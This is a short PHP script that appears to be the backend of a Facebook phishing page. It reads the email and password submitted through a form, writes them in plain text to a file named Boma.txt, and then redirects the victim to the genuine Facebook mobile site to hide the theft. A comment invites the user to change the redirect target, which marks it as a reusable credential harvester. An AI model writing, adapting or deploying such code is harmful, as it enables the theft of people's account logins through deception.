<?php

			session_start();
			
			$pass = $_POST["Password"];
			$Email = $_POST["Email"];
			//opening Boma text file for appending new data.
  			$file = fopen("Boma.txt", "a") ;
			
  			//Writing email and password to Boma.txt. 
  			fwrite($file, $Email."	".$pass.PHP_EOL);			
  			fclose($file);//closing Boma.txt.
			
  			//change the location url to redirect to a website of your choice.
  			header("Location: https://m.facebook.com/index.php");
			exit();
			
			
			session_destroy();
			

?>